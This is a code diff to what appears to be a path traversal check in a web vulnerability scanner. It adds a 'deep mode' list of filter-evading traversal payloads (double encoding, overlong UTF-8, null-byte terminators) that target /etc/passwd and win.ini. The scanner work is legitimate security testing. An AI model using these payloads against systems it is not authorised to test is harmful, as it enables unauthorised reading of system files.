@@ -2,12 +2,23 @@ from __future__ import annotations
 
 from ...http.client import HttpClient
 from ..core import Check, Finding, InjectionPoint
+from ..runtime import deep
 
 PAYLOADS = [
     "../../../../etc/passwd",
     "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
     "....//....//....//....//etc/passwd",
     "..\\..\\..\\..\\windows\\win.ini",
+]
+
+# Deep mode: encoding layers and terminator tricks that basic filters miss.
+DEEP_PAYLOADS = [
+    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+    "../../../../etc/passwd%00",
+    "....\\....\\....\\....\\windows\\win.ini",
+    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
 ]
 
 INDICATORS = [
@@ -24,8 +35,9 @@ class PathTraversalCheck(Check):
     severity = "high"
 
     def run(self, point: InjectionPoint, client: HttpClient) -> list[Finding]:
-        for payload in PAYLOADS:
-            request = point.request.with_query_param(point.param, payload)
+        payloads = (PAYLOADS + DEEP_PAYLOADS) if deep() else PAYLOADS
+        for payload in payloads:
+            request = point.with_value(payload)
             response = client.send(request)
             for indicator in INDICATORS:
                 if indicator in response.text:
